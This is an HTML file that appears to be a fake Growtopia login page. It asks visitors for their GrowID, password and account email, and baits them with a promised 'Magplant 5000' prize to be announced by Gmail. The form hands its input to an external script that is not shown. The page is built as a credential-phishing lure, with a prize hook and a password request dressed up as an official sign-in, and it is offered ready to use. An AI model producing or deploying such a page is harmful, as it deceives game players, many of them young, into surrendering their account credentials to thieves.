<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Growtopia Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background-image">
        <div class="login-container">
            <!-- Shortened Promo message after login -->
            <p class="promo-message">After login, check your Gmail within 5-10 minutes to see if you win the Magplant 5000!</p>

            <!-- Main title -->
            <h1>Growtopia Login</h1>

            <!-- Login Form -->
            <form id="loginForm">
                <div class="input-group">
                    <label for="growId">GrowID <span>*</span></label>
                    <input type="text" id="growId" name="growId" placeholder="Enter your Grow ID" required>
                </div>

                <div class="input-group">
                    <label for="password">Password (GrowID) <span>*</span></label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>

                <div class="input-group">
                    <label for="email">Current GrowID Email <span>*</span></label>
                    <input type="email" id="email" name="email" placeholder="Enter your Current GrowID Email" required>
                </div>

                <button type="submit">Login</button>
            </form>
        </div>

        <!-- Left Side Message After Login -->
        <div id="leftMessage" class="left-message" style="display: none;">
            <p><strong>Check your Gmail for the Magplant 5000 result!</strong> Youâ€™ll get the message with instructions within 5-10 minutes.</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
